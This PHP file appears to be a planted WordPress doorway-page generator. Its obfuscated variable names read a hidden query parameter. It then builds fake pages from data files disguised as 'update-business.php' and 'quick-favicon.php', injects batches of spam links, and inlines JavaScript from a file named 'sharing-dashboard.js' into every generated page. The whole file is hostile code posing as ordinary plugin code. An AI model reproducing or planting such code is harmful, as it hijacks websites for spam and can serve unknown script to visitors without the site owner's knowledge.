<?php
$gTorHT = intval(get_query_var('znfiljf'));

if ($gTorHT < 1 || $gTorHT > 3202) return;
$s4nGhhJTOM = file(plugin_dir_path(__FILE__).'update-business.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$uU52BR = explode(';', $s4nGhhJTOM[$gTorHT]);
if (count($uU52BR) < 2) return;
$duxx4kE = $uU52BR[0];
$iS4WuuI  = $uU52BR[1];
$vkqbFlhg = $uU52BR[2];
$gH6Ape  = $uU52BR[3];
$xXtdv = $uU52BR[4];
set_query_var('mcjrl', $duxx4kE);

$duwfJPwk = '';
$gODh1J = plugin_dir_path(__FILE__).'quick-favicon.php';
if (is_file($gODh1J)) {
	$j4qzFrji3 = file($gODh1J, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($j4qzFrji3);
	shuffle($j4qzFrji3);
	$bRsbqJ5ft = mt_rand(2, 5);
	if (count($j4qzFrji3) > $bRsbqJ5ft) {
		for ($hLgp2Aj2Z = 0; $hLgp2Aj2Z < $bRsbqJ5ft; $hLgp2Aj2Z++) {
			$eEaI0pQHXA = array_shift($j4qzFrji3);
			$duwfJPwk .= '<p><a href="'.$eEaI0pQHXA.'">'.$eEaI0pQHXA.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $duxx4kE; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $iS4WuuI . "</p>\n";
				if (strlen($gH6Ape) > 0) echo "<p>" . $gH6Ape . "</p>\n";
				if (strlen($vkqbFlhg) > 0) echo "<p>" . $vkqbFlhg . "</p>\n";
				if (strlen($xXtdv) > 0) echo '<p><a href="#"><img src="'.$xXtdv.'"></a>' . "</p>\n";
				echo $duwfJPwk;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$ugVyL3Ys = plugin_dir_path(__FILE__) . 'sharing-dashboard.js';
if (is_file($ugVyL3Ys)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($ugVyL3Ys);
	echo '</script>';
}
get_footer();
?>
